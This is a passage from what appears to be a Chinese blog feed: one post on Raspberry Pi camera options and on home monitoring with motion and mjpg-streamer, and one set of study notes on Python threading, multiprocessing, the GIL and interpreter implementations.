-bm, --burst            : 运行burst capture mode

-sh, --sharpness        : 设置图像锐度 （-100 到 100）
-co, --contrast         : 设置图像对比度 （-100 到 100）
-br, --brightness       : 设置图像亮度 （0 到 100）
-sa, --saturation       : 设置图像饱和度 （-100 到 100）
-ISO, --ISO             : 设置摄像头感光度
-vs, --vstab            : Turn on video stabilisation 开启摄像头防抖模式（是这个意思吗？）
-ev, --ev               : 设置EV补偿
-ex, --exposure         : 设置曝光模式（参见提示）
-awb, --awb             : 设置AWB模式（参见提示）
-ifx, --imxfx           : 设置图像效应（参见提示）
-cfx, --colfx           : 设置色彩效应（参见提示）
-mm, --metering         : 设置测光模式（参见提示）
-rot, --rotation        : 设置图像旋转 （0到359）
-hf, --hflip            : 设置水平翻转 horizontal flip
-vf, --vflip            : 设置垂直翻转 vertical flip
-roi, --roi             : 设置interest区域 （啥叫interset?）
--ss, --shutter         : 设置快门速度，微秒
--awbg, --awbgains      : 设置AWB阈值， AWB模式必须关闭
--drc, --drc            : 设置DRC水平

</数字></ms></文件名></文件名></0到100></尺寸></尺寸></code></pre>

<h3 id="预览参数与命令"><a href="#预览参数与命令" class="headerlink" title="预览参数与命令"></a>预览参数与命令</h3><pre><code>
-p, --preview           : 预览窗口大小设置 <x,y,w,h>
-f, --fullscreen        : 全屏幕预览模式
-op, --opacity          : 预览窗口透明度 （0-255）
-n, --nopreview         : 不显示预览窗口
-gs, -glscene           : GL屏幕尺寸等参数
-gw, -glwin             : GL窗口参数
</x,y,w,h></code></pre>

<h3 id="曝光模式选项"><a href="#曝光模式选项" class="headerlink" title="曝光模式选项"></a>曝光模式选项</h3><pre><code>
auto                    : 自动曝光模式
night                   : 夜间拍摄模式
nightpreview            : 夜间预览拍摄模式
backlight               : 逆光拍摄模式
spotlight               : 聚光灯拍摄模式
sports                  : 运动拍摄模式
snow                    : 雪景拍摄模式
beach                   : 海滩拍摄模式
verylong                : 长时间曝光拍摄模式
fixedfps                : 帧约束拍摄模式
antishake               : 防抖模式
fireworks               : 烟火拍摄模式
</code></pre>

<h3 id="自动白平衡选项"><a href="#自动白平衡选项" class="headerlink" title="自动白平衡选项"></a>自动白平衡选项</h3><pre><code>
off                     : 关闭白平衡测算
auto                    : 自动模式（默认）
sun                     : 日光模式
cloud                   : 多云模式
shade                   : 阴影模式
tungsten                : 钨灯模式
fluorescent             : 荧光灯模式
incandescent            : 白炽灯模式
flash                   : 闪光模式
horizon                 : 地平线模式
</code></pre>

<h3 id="图像特效选项"><a href="#图像特效选项" class="headerlink" title="图像特效选项"></a>图像特效选项</h3><pre><code>
none                    : 无特效（默认）
negative                : 反色图像
solarise                : 曝光过度图像
posterize               : 色调图像
whiteboard              : 白板特效
blackboard              : 黑板特效
sketch                  : 素描风格特效
denoise                 : 降噪图像
emboss                  : 浮雕图像
oilpaint                : 油画风格特效
hatch                   : 草图特效
gpen                    : 马克笔特效
pastel                  : 柔化风格特效
watercolour             : 水彩风格特效
film                    : 胶片颗粒风格特效
blur                    : 模糊图像
saturation              : 色彩饱和图像
colourswap              : 暂未可用
washedout               : 暂未可用
posterise               : 暂未可用
colourpoint             : 暂未可用
colourbalance           : 暂未可用
cartoon                 : 暂未可用
</code></pre>

<h3 id="测光模式选项"><a href="#测光模式选项" class="headerlink" title="测光模式选项"></a>测光模式选项</h3><pre><code>
average                 : 全画面平衡测光
spot                    : 点测光
backlit                 : 模拟背光图像
matrix                  : 阵列测光
</code></pre>

<h2 id="使用motion搭建视频监控系统"><a href="#使用motion搭建视频监控系统" class="headerlink" title="使用motion搭建视频监控系统"></a>使用motion搭建视频监控系统</h2><p>motion是Linux下一款轻量级的视频监控软件，motion可以提供网络摄像头的功能，当拍摄过程中画面发生变动时，Motion可以保存动作发生时的图片和视频，这时如果将抓拍的图片或视频上传到百度云或者DropBox中就可以实现一个简单的监控系统。具体实现如下：</p>
<p>安装motion</p>
<pre><code>$sudo apt-get install motion</code></pre>

<p>配置motion选项时，先对配置文件进行备份</p>
<pre><code>$sudo cp /etc/motion/motion.conf /etc/motion/motion.conf.bak</code></pre>
修改/etc/motion/motion.conf选项

<pre><code>$sudo vim /etc/motion/motion.conf</code></pre>

<pre><code>
daemon on                            #开启守护进程（选配）
target_dir /home/pi/motion-images    #文件保存的路径，图像变化时图片保存的路径         
stream_localhost off                 #允许通过网页查看摄像
</code></pre>


<p>值得注意的是target_dir选项，默认值为/var/lib/motion。这是motion存储文件的目标文件夹。所存储文件包括了运动捕捉产生的图片或视频。用户motion必须对该目标文件夹有写入权限。这里我们将默认的文件目标进行了修改。同时注意，流媒体的默认端口是8081，这里后面会使用到。</p>
<p>最后，在设置文件中，默认的视频设备（videodevice项）是/dev/video0。如果你连接好了摄像头，却无法在/dev下找到video0，那么可以尝试加载V4L2驱动：</p>
<p><pre><code><br>sudo rpi-update<br>sudo modprobe bcm2835-v4l2 #加载驱动模块<br></code></pre><br>这样每次启动都要重新加载v4l2驱动，如果你希望开机就加载v4l2驱动可以在/etc/modules文件中加入bcm2835-v4l2，这样每次开机就可以直接加载v4l2驱动模块。</p>
<p>修改/etc/default/motion，更改守护进程的设置：</p>
<p><pre><code>start_motion_daemon=yes</code></pre><br>然后，启动motion</p>
<p><pre><code>sudo motion</code></pre><br>在同一局域网下的其他电脑上，用浏览器打开192.168.23.122:8081，可以直接看到即时拍摄的流媒体：</p>
<p>动作捕捉的图片和视频将存储在目录/home/pi/motion-images下。如果想改变动作捕捉的相关参数，例如动作捕捉的敏感度等，可以在/etc/motion/motion.conf中修改,这里需要参考具体motion的使用。</p>
<p>当拍摄过程中画面发生变动时，Motion可以保存动作发生时的图片和视频</p>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p><a href="http://lavrsen.dk/foswiki/bin/view/Motion/ConfigFileOptions" target="_blank" rel="noopener">Motion - Config File Options</a><br><a href="https://blog.csdn.net/u013162035/article/details/78580486" target="_blank" rel="noopener">汉化参数参考</a></p>
<h2 id="DIY网页端的树莓派流畅监控，官方CSI摄像头的正确用法"><a href="#DIY网页端的树莓派流畅监控，官方CSI摄像头的正确用法" class="headerlink" title="DIY网页端的树莓派流畅监控，官方CSI摄像头的正确用法"></a>DIY网页端的树莓派流畅监控，官方CSI摄像头的正确用法</h2><p>参考连接：</p>
<p><a href="https://blog.csdn.net/NCTU_to_prove_safety/article/details/68928496" target="_blank" rel="noopener">https://blog.csdn.net/NCTU_to_prove_safety/article/details/68928496</a></p>
<p>先安装依赖：</p>
<p><code>apt-get install libjpeg8-dev cmake</code></p>
<p>今天的主角 —— 别人的Github</p>
<p>先在树莓派上下载其软件：</p>
<p><code>wget https://github.com/jacksonliam/mjpg-streamer/archive/master.zip</code></p>
<p><code># unzip master.zip   #解压~</code></p>
<p><code># cd mjpg-streamer-master/mjpg-streamer-experimental</code></p>
<p><code># vim plugins/input_raspicam/input_raspicam.c    #编辑该文件，没有vim就用别的</code></p>
<p>进去以后，搜索fps，也就是按一下/键，然后输入fps，然后回车</p>
<p><img data-src="http://source.jianyujianyu.com/input_raspicam.c.png" alt></p>
<p>然后保存退出编辑器后，编译：</p>
<p><code># make clean all</code></p>
<p>写个脚本<br>假设刚才mjpg-streamer-master文件夹就在/test目录。</p>
<p>回到自己的目录，编写脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># cd</span><br><span class="line"></span><br><span class="line"># vim start_web_video.sh</span><br></pre></td></tr></table></figure>
<p>复制以下两句：</p>
<p><code>cd /test/mjpg-streamer-master/mjpg-streamer-experimental
./mjpg_streamer -i &quot;./input_raspicam.so&quot; -o &quot;./output_http.so -w ./www&quot;</code></p>
<p>保存退出，给予权限：</p>
<p><code># chmod +x start_web_video.sh</code></p>
<p>运行<br><code>./start_web_video.sh</code></p>
<p><img data-src="http://source.jianyujianyu.com/%E5%90%AF%E5%8A%A8start_web_video.sh.png" alt></p>
<p>用浏览器访问<br>在你的电脑的浏览器访问</p>
<p><code>http://你树莓派的ip:8080</code></p>
]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>死磕-python与多线程多进程</title>
    <url>/%E6%AD%BB%E7%A3%95-python%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="进程与线程的区别"><a href="#进程与线程的区别" class="headerlink" title="进程与线程的区别"></a>进程与线程的区别</h2><p>1、<strong>进程</strong>是资源分配的最小单位，<strong>线程</strong>是程序执行的最小单位（资源调度的最小单位）<br>2、<strong>进程</strong>有自己的独立地址空间，每启动一个进程，系统就会为它分配地址空间，<strong>建立数据表</strong>来维护代码段、堆栈段和数据段，这种操作非常昂贵。<br>而<strong>线程</strong>是共享进程中的数据的，使用相同的地址空间，因此CPU切换一个线程的花费远比进程要小很多，同时创建一个线程的开销也比进程要小很多。<br>3、<strong>线程之间的通信</strong>更方便，同一进程下的线程共享全局变量、静态变量等数据，而<strong>进程之间的通信</strong>需要以通信的方式（IPC)进行。<br><a id="more"></a></p>
<ul>
<li>不过如何处理好同步与互斥是编写多线程程序的难点。</li>
</ul>
<p>4、但是<strong>多进程程序更健壮</strong>，多线程程序只要有一个线程死掉，整个进程也死掉了，而一个进程死掉并不会对另外一个进程造成影响，因为进程有自己独立的地址空间。</p>
<p>5、线程是一个上下文的执行指令，而进程则是与运算相关的一簇资源。</p>
<p>6、同一个进程的线程之间可以直接通信，但是进程之间的交流需要借助中间代理来实现。</p>
<p>7、创建新的线程很容易，但是创建新的进程需要对父进程做一次复制。</p>
<p>8、一个线程可以操作同一进程的其他线程，但是进程只能操作其子进程。</p>
<p>9、线程启动速度快，进程启动速度慢（但是两者运行速度没有可比性）。</p>
<h2 id="进程与线程的同步"><a href="#进程与线程的同步" class="headerlink" title="进程与线程的同步"></a>进程与线程的同步</h2><p>进程：无名管道、有名管道、信号、共享内存、消息队列、信号量<br>进程：互斥量、读写锁、自旋锁、线程信号、条件变量</p>
<h2 id="堆与栈"><a href="#堆与栈" class="headerlink" title="堆与栈"></a>堆与栈</h2><p>堆：是大家共有的空间，分<strong>全局堆</strong>和<strong>局部堆</strong>。<strong>全局堆</strong>就是所有没有分配的空间，<strong>局部堆</strong>就是用户分配的空间。堆在操作系统对进程初始化的时候分配，运行过程中也可以向系统要额外的堆，但是记得用完了要还给操作系统，要不然就是<strong>内存泄漏</strong>。</p>
<p>栈：是个<strong>线程独有</strong>的，保存其运行状态和局部自动变量的。栈在线程开始的时候初始化，每个线程的栈互相独立，因此，栈是　thread safe 的。操作系统在切换线程的时候会自动的切换栈，就是切换　ＳＳ／ＥＳＰ 寄存器。<strong>栈空间不需要在高级语言里面显式的分配和释放</strong>。</p>
<h2 id="线程共享的环境"><a href="#线程共享的环境" class="headerlink" title="线程共享的环境"></a>线程共享的环境</h2><p>包括：<strong>进程代码段、进程的公有数据</strong>(利用这些共享的数据，线程很容易的实现相互之间的通讯)、<strong>进程打开的文件描述符、信号的处理器、进程的当前目录和进程用户ID与进程组ID</strong>。</p>
<p>进程拥有这许多共性的同时，还拥有自己的个性。有了这些个性，线程才能实现并发性。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">同一进程下的线程可以共享以下？BD </span><br><span class="line">A stack   B data section   C register set   D file fd </span><br><span class="line">解释： </span><br><span class="line">stack 栈 </span><br><span class="line">data section 数据段 </span><br><span class="line">register set 寄存器组  </span><br><span class="line">file fd 文件描述符</span><br></pre></td></tr></table></figure></p>
<h2 id="进程个性："><a href="#进程个性：" class="headerlink" title="进程个性："></a>进程个性：</h2><p>1.线程ID<br>每个线程都有自己的线程ID，这个ID在本进程中是唯一的。进程用此来标识线程。<br>2.寄存器组的值<br>由于线程间是并发运行的，每个线程有自己不同的运行线索，当从一个线程切换到另一个线程上时，必须将原有的线程的寄存器集合的状态保存，以便将来该线程在被重新切换到时能得以恢复。<br>3.线程的堆栈<br>堆栈是保证线程独立运行所必须的。<br>线程函数可以调用函数，而被调用函数中又是可以层层嵌套的，所以线程必须拥有自己的函数堆栈，使得函数调用可以正常执行，不受其他线程的影<br>响。<br>4.错误返回码<br>由于同一个进程中有很多个线程在同时运行，可能某个线程进行系统调用后设置了errno值，而在该线程还没有处理这个错误，另外一个线程就在此时被调度器投入运行，这样错误值就有可能被修改。所以，不同的线程应该拥有自己的错误返回码变量。<br>5.线程的信号屏蔽码<br>由于每个线程所感兴趣的信号不同，所以线程的信号屏蔽码应该由线程自己管理。但所有的线程都共享同样的信号处理器。<br>6.线程的优先级<br>由于线程需要像进程那样能够被调度，那么就必须要有可供调度使用的参数，这个参数就是线程的优先级。</p>
<h2 id="实现并发的方式有多种："><a href="#实现并发的方式有多种：" class="headerlink" title="实现并发的方式有多种："></a>实现并发的方式有多种：</h2><p>比如多进程、多线程、IO多路复用。</p>
<h3 id="python-中的-GIL"><a href="#python-中的-GIL" class="headerlink" title="python 中的 GIL"></a>python 中的 GIL</h3><p>在非 python 环境中，<br>单核情况下，同时只能有一个任务执行。<br>多核时可以支持多个线程同时执行。<br>但是在 <strong>python 中，无论有多少核，同时只能执行一个线程</strong>。究其原因，这就是由于 GIL 的存在导致的。</p>
<p>GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。某个线程想要执行，必须先拿到 GIL，我们可以把GIL看作是“通行证”，并且在一个 python 进程中，GIL 只有一个。拿不到通行证的线程，就不允许进入CPU执行。GIL只在 cpython 中才有，因为 cpython 调用的是 c 语言的原生线程，所以他不能直接操作 cpu，只能利用GIL保证同一时间只能有一个线程拿到数据。</p>
<p>Jython 是将 Python code 在JVM 上面跑和调用 java code的解释器。</p>
<p>而在 pypy 和 jpython 中是没有GIL的。</p>
<p>Python 虽然不能利用多线程实现多核任务，但可以<strong>通过多进程实现多核任务</strong>。多个Python 进程有各自独立的 GIL 锁，互不影响</p>
<h3 id="pypy-和-Jython-和-Cpython-和-Cython"><a href="#pypy-和-Jython-和-Cpython-和-Cython" class="headerlink" title="pypy 和 Jython 和 Cpython 和 Cython"></a>pypy 和 Jython 和 Cpython 和 Cython</h3><p>python是一种编程语言。但这种语言有多种实现，而且与其他语言不同，python 并没有一个专门的机构负责实现，而是由多个社区来实现。</p>
<p>其中使用c语言开发的叫做 python，在于别的语言开发的 python 对比时为避免歧义通常称为 CPython。</p>
<p>同样的，使用 java 开发的叫做 JPython，使用 .net 开发的叫做 IronPython。</p>
<p>而 PyPy 与 CPython 的不同在于，别的一些 python 实现如 CPython 是使用解释执行的方式，这样的实现方式在性能上是很凄惨的。而 PyPy 使用了 JIT(即时编译) 技术，在性能上得到了提升。</p>
<p>由于 Python 是<strong>动态编译</strong>的语言，和 C/C++、Java 或者 Kotlin 等静态语言不同，它是在运行时一句一句代码地边编译边执行的，而 Java 是提前将高级语言编译成了 JVM 字节码，运行时直接通过 JVM 和机器打交道，所以进行密集计算时运行速度远高于动态编译语言。</p>
<p>PyPy，它使用了 <strong>JIT（即时编译）技术</strong>，混合了动态编译和静态编译的特性，仍然是一句一句编译源代码，但是<strong>会将翻译过的代码缓存起来</strong>以降低性能损耗。相对于静态编译代码，即时编译的代码可以处理延迟绑定并增强安全性。绝大部分 Python 代码都可以在 PyPy 下运行，但是 PyPy 和 CPython 有一些是不同的。</p>
<h4 id="CPython"><a href="#CPython" class="headerlink" title="CPython"></a>CPython</h4><p>是用 C 语言实现 Pyhon，是目前应用最广泛的解释器。最新的语言特性都是在这个上面先实现，基本包含了所有第三方库支持，<br>但是 CPython 有几个缺陷，<br>一是 (GIL) 全局锁使 Python 在多线程效能上表现不佳，<br>二是 CPython 无法支持 JIT（即时编译），导致其执行速度不及 Java 和 Javascipt 等语言。于是出现了 Pypy。</p>
<h4 id="Pypy"><a href="#Pypy" class="headerlink" title="Pypy"></a>Pypy</h4><p>是用 Python 自身实现的解释器。针对 CPython 的缺点进行了各方面的改良，性能得到很大的提升。最重要的一点就是 Pypy 集成了 JIT。<br>但是，<strong>Pypy无法支持官方的C/Python API</strong>，导致无法使用例如Numpy，Scipy等重要的第三方库。这也是现在Pypy没有被广泛使用的原因吧。</p>
<h4 id="Cpython"><a href="#Cpython" class="headerlink" title="Cpython"></a>Cpython</h4><p>Cython是结合了Python和C的语法的一种语言，可以简单的认为就是给Python加上了静态类型后的语法，使用者可以维持大部分的Python语法，而不需要大幅度调整主要的程式逻辑与算法。但由于会直接编译为二进制程序，所以性能较Python会有很大提升。</p>
<p>Cython被大量运用在CPython函式库的撰写，以取得较高的执行效能。Cython将CPython代码转译成 C 或 C++ 语法后，自动包装上函式呼叫界面生成 .pyx 后缀的执行档，即可当成普通的函式库。其性能一般逊于原生的 C/C++ 函式库，但由于 CPython 语法的易用性可以缩短开发时间。Cython 也可以用于编译以 C/C++ 为 CPython 撰写的函式库。</p>
<h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>多任务可以由多进程完成，也可以由一个进程内的多线程完成。</p>
<p>我们前面提到了进程是由若干线程组成的，一个进程至少有一个线程。</p>
<p>由于线程是操作系统直接支持的执行单元，因此，高级语言通常都内置多线程的支持。</p>
<h4 id="线程常用方法"><a href="#线程常用方法" class="headerlink" title="线程常用方法"></a>线程常用方法</h4><table>
<thead>
<tr>
<th>方法</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>start()</td>
<td>线程准备就绪，等待CPU调度</td>
</tr>
<tr>
<td>setName()</td>
<td>为线程设置名称</td>
</tr>
<tr>
<td>getName()</td>
<td>获取线程名称</td>
</tr>
<tr>
<td>setDaemon(True)</td>
<td>设置为守护线程</td>
</tr>
<tr>
<td>join()</td>
<td>逐个执行每个线程，执行完毕后继续往下执行</td>
</tr>
<tr>
<td>run()</td>
<td>线程被cpu调度后自动执行线程对象的run方法，如果想自定义线程类，直接重写run方法就行了</td>
</tr>
</tbody>
</table>
<h4 id="Python多线程"><a href="#Python多线程" class="headerlink" title="Python多线程"></a>Python多线程</h4><p>Python的线程是真正的Posix Thread，而不是模拟出来的线程。</p>
<p>Python的标准库提供了两个模块：thread和threading，thread是低级模块，threading是高级模块，对thread进行了封装。绝大多数情况下，我们只需要使用threading这个高级模块。</p>
<p>启动一个线程就是把一个函数传入并创建Thread实例，然后调用start()开始执行：</p>
<p>由于任何进程默认就会启动一个线程，我们把该线程称为主线程，主线程又可以启动新的线程，Python 的 threading 模块有个 current_thread() 函数，它永远返回当前线程的实例。主线程实例的名字叫 MainThread，子线程的名字在创建时指定，我们用 LoopThread 命名子线程。名字仅仅在打印时用来显示，完全没有其他意义，如果不起名字 Python 就自动给线程命名为Thread-1，Thread-2……</p>
<p>多线程编程，模型复杂，容易发生冲突，必须用锁加以隔离，同时，又要小心死锁的发生。</p>
<p>Python解释器由于设计时有GIL全局锁，导致了多线程无法利用多核。多线程的并发在Python中就是一个美丽的梦。</p>
<h5 id="执行效率分析"><a href="#执行效率分析" class="headerlink" title="执行效率分析"></a>执行效率分析</h5><p>python针对不同类型的代码执行效率也是不同的：</p>
<p>1、CPU密集型代码(各种循环处理、计算等等)，在这种情况下，由于计算工作多，ticks计数很快就会达到阈值，然后触发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对CPU密集型代码并不友好。</p>
<p>2、IO密集型代码(文件处理、网络爬虫等涉及文件读写的操作)，多线程能够有效提升效率(单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序执行效率)。所以python的多线程对IO密集型代码比较友好。</p>
<p>注：python下想要充分利用多核CPU，就用多进程。因为每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言)。</p>
<h5 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h5><p>多线程和多进程最大的不同在于，<strong>多进程中</strong>，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而<strong>多线程</strong>中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。</p>
<p>我们定义了一个共享变量 balance，初始值为 0，并且启动两个线程，先存后取，理论上结果应该为 0，但是，由于线程的调度是由操作系统决定的，当 t1、t2 交替执行时，只要循环次数足够多，balance 的结果就不一定是0了。</p>
<p>如果我们要确保 balance计 算正确，就要给 change_it() 上一把锁，当某个线程开始执行change_it() 时，我们说，该线程因为获得了锁，因此其他线程不能同时执行 change_it()，只能等待，直到锁被释放后，获得该锁以后才能改。由于<strong>锁只有一个</strong>，无论多少线程，同一时刻最多只有一个线程持有该锁，所以，不会造成修改的冲突。创建一个锁就是通过threading.Lock() 来实现：</p>
<p>当多个线程同时执行 lock.acquire() 时，只有<strong>一个线程能成功地获取锁</strong>，然后继续执行代码，其他线程就继续等待直到获得锁为止。</p>
<p>获得锁的线程用完后一定要释放锁，否则那些苦苦等待锁的线程将永远等待下去，成为死线程。所以我们用try…finally来<strong>确保锁一定会被释放</strong>。</p>
<p>锁的好处就是确保了某段关键代码只能由一个线程从头到尾完整地执行，坏处当然也很多，首先是阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了。其次，由于可以存在多个锁，<strong>不同的线程持有不同的锁</strong>，并试图获取对方持有的锁时，可能会造成死锁，导致多个线程全部挂起，既不能执行，也无法结束，只能靠操作系统强制终止。</p>
<p>互斥锁（mutex）</p>
<p>递归锁</p>
<p>信号量（BoundedSemaphore类）：<br>互斥锁同时只允许一个线程更改数据，而Semaphore是同时允许一定数量的线程更改数据 </p>
<p>事件（Event类）<br>| 方法   | 注释                                                 |<br>|——–|——————————————————|<br>| clear  | 将flag设置为“False”                                  |<br>| set    | 将flag设置为“True”                                   |<br>| is_set | 判断是否设置了flag                                   |<br>| wait   | 会一直监听flag，如果没有检测到flag就一直处于阻塞状态 |</p>
<p>条件（Condition类）：<br>使得线程等待，只有满足某条件时，才释放n个线程</p>
<p>定时器（Timer类）：<br>定时器，指定n秒后执行某操作</p>
<h5 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h5><p>线程和进程的操作是由程序触发系统接口，最后的执行者是系统，它本质上是操作系统提供的功能。而协程的操作则是程序员指定的，在python中通过yield，人为的实现并发处理。</p>
<p>协程存在的意义：对于多线程应用，CPU通过切片的方式来切换线程间的执行，线程切换时需要耗时。协程，则只使用一个线程，分解一个线程成为多个“微线程”，在一个线程中规定某个代码块的执行顺序。</p>
<p><strong>协程的适用场景</strong>：当程序中存在大量不需要CPU的操作时（IO）。</p>
<p>常用第三方模块gevent和greenlet。（本质上，gevent是对greenlet的高级封装，因此一般用它就行，这是一个相当高效的模块。）</p>
<h5 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h5><p>“from multiprocessing.dummy import Pool”这样导入的 Pool表示的是线程池。</p>
<p>线程池(from multiprocessing.dummy import Pool)<br><strong>线程池的原理</strong><br>线程池首先会维护一个任务队列<br>生成工作使用的线程(可以是自定义个数，也可以是系统默认)<br>线程分别从队列中取出任务，并执行，一个任务执行完成需要告诉主线程完成一个任务<br>再从任务队列中取出任务，直到所有任务为空，退出线程<br><strong>为什么需要使用线程池</strong></p>
<ul>
<li>创建/销毁线程伴随着系统开销，过于频繁的创建/销毁线程，会很大程度上影响处理效率。<pre><code>记创建线程消耗时间T1，执行任务消耗时间T2，销毁线程消耗时间T3，如果T1+T3&gt;T2，那说明开启一个线程来执行这个任务太不划算了！在线程池缓存线程可用已有的闲置线程来执行新任务，避免了创建/销毁带来的系统开销。
</code></pre></li>
<li>线程并发数量过多，抢占系统资源从而导致阻塞。<br>  线程能共享系统资源，如果同时执行的线程过多，就有可能导致系统资源不足而产生阻塞的情况。</li>
<li>对线程进行一些简单的管理。<br>  比如：延时执行、定时循环执行的策略等，运用线程池都能进行很好的实现。</li>
</ul>
<p><strong>使用思路</strong><br>1，将任务放在队列<br>    1）创建队列：（初始化）<br>    2）设置大小，线程池的最大容量<br>    3）真实创建的线程 列表<br>    4）空闲的线程数量</p>
<p>2，着手开始处理任务<br>    1）创建线程<br>        2）空闲线程数量大于0，则不再创建线程<br>        3）创建线程池的数量 不能高于线程池的限制<br>        4）根据任务个数判断  创建线程的数量<br>    2）线程去队列中取任务<br>        1）取任务包（任务包是一个元祖）<br>        2）任务为空时，不再取（终止）</p>
<h3 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h3><p>Unix/Linux操作系统提供了一个fork()系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，但是fork()调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</p>
<p>子进程永远返回0，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用getppid()就可以拿到父进程的ID。</p>
<p>进程是资源（CPU、内存等）分配的基本单位，它是程序执行时的一个实例。<strong>程序运行时</strong>系统就会创建一个进程，并为它分配资源，然后把该进程放入<strong>进程就绪队列</strong>，进程调度器选中它的时候就会为它分配 CPU 时间，程序开始真正运行。</p>
<p>Linux系统函数fork()可以在父进程中创建一个子进程，这样的话，在一个进程接到来自客户端新的请求时就可以复制出一个子进程让其来处理，父进程只需负责监控请求的到来，然后创建子进程让其去处理，这样就能做到并发处理。</p>
<h4 id="Python多进程"><a href="#Python多进程" class="headerlink" title="Python多进程"></a>Python多进程</h4><p>python中的多进程主要使用到 multiprocessing 这个库</p>
<h5 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h5><p>由于进程之间数据是不共享的，所以不会出现多线程GIL带来的问题。多进程之间的通信通过Queue()或Pipe()来实现</p>
<p><strong>Queue()</strong><br>使用方法跟threading里的queue差不多</p>
<p><strong>Pipe()</strong><br>Pipe的本质是进程之间的数据传递，而不是数据共享，这和socket有点像。pipe()返回两个连接对象分别表示管道的两端，每端都有send()和recv()方法。如果两个进程试图在同一时间的同一端进行读取和写入那么，这可能会损坏管道中的数据。</p>
<h5 id="数据的共享"><a href="#数据的共享" class="headerlink" title="数据的共享"></a>数据的共享</h5><p>通过Manager可实现进程间数据的共享。Manager()返回的manager对象会通过一个服务进程，来使其他进程通过代理的方式操作python对象。manager对象支持 list, dict, Namespace, Lock, RLock, Semaphore, BoundedSemaphore, Condition, Event, Barrier, Queue, Value ,Array.</p>
<h5 id="进程锁（进程同步）"><a href="#进程锁（进程同步）" class="headerlink" title="进程锁（进程同步）"></a>进程锁（进程同步）</h5><p>数据输出的时候保证不同进程的输出内容在同一块屏幕正常显示，防止数据乱序的情况。</p>
<h5 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h5><p>由于<strong>进程启动的开销比较大</strong>，使用多进程的时候会导致大量内存空间被消耗。为了防止这种情况发生可以使用进程池，（由于启动线程的开销比较小，所以不需要线程池这种概念，多线程只会频繁得切换cpu导致系统变慢，并不会占用过多的内存空间）</p>
<p>进程池内部维护一个进程序列，当使用时，去进程池中获取一个进程，如果进程池序列中没有可供使用的进程，那么程序就会等待，直到进程池中有可用进程为止。在上面的程序中产生了10个进程，但是只能有5同时被放入进程池，剩下的都被暂时挂起，并不占用内存空间，等前面的五个进程执行完后，再执行剩下5个进程。</p>
<p><strong>进程池中常用方法：</strong><br>apply() 同步执行（串行）<br>apply_async() 异步执行（并行）<br>terminate() 立刻关闭进程池<br>join() 主进程等待所有子进程执行完毕。必须在close或terminate()之后。<br>close() 等待所有进程结束后，才关闭进程池。</p>
<h3 id="python什么时候使用多线程，什么时候使用多进程？"><a href="#python什么时候使用多线程，什么时候使用多进程？" class="headerlink" title="python什么时候使用多线程，什么时候使用多进程？"></a>python什么时候使用多线程，什么时候使用多进程？</h3><p>1.多线程使用场景：IO密集型</p>
<p>2.多进程使用场景：CPU密集型</p>
<p>multiprocessing开销比较大，原因就在于：<br>主进程和子进程之间通信，必须进行序列化和反序列化的操作</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/strive-man/p/8904495.html" target="_blank" rel="noopener">为什么会有这么多python？其实python并不是编程语言！</a><br><a href="https://blog.csdn.net/somezz/article/details/80963760" target="_blank" rel="noopener">Python 多线程操作</a><br><a href="https://www.jianshu.com/p/644dbb6d4cc8" target="_blank" rel="noopener">python多线程与多进程</a><br><a href="https://www.cnblogs.com/tmdhhl/p/multiprocessing.html" target="_blank" rel="noopener">multiprocessing中进程池，线程池的使用</a><br><a href="https://www.cnblogs.com/ssyfj/p/9218730.html" target="_blank" rel="noopener">python—协程理解</a><br><a href="https://www.cnblogs.com/whatisfantasy/p/6440585.html" target="_blank" rel="noopener">搞定python多线程和多进程</a><br><a href="https://www.liaoxuefeng.com/wiki/897692888725344/923056118147584" target="_blank" rel="noopener">廖雪峰——进程和线程</a></p>
]]></content>
      <categories>
        <category>多线程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>C++</tag>
        <tag>多线程</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title>2019-python-文章收集</title>
    <url>/2019-python-%E6%96%87%E7%AB%A0%E6%94%B6%E9%9B%86/</url>
